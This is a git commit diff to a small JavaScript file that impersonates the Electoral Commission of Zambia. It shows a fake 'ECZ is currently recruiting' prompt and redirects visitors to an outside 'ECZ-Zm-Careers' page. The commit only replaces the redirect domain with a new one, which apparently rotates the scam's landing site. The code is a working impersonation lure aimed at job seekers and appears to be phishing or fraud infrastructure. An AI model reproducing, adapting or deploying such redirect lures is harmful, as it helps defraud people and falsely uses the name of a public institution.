301295bc8998c1796abc49d44783d9a9d214fe3b
newetijazz29 <newetijazz29@gmail.com>
2026-02-07 10:49:38 +0100

    Update zmelectoral.js

--- zmelectoral.js
+++ zmelectoral.js
@@ -1,5 +1,5 @@
 var password = 'electoral Commission of Zambia'
 password=prompt('NOTICE: ECZ Zambia is currently recruiting, press OK to apply for the','electoral Commission of Zambia');
 if (password != 'electoral Commission of Zambia') {
-location.href='https://www.itinpty.xyz/ecz-Zm-Careers';
+location.href='https://www.mfonumoh.site/ecz-Zm-Careers';
 }
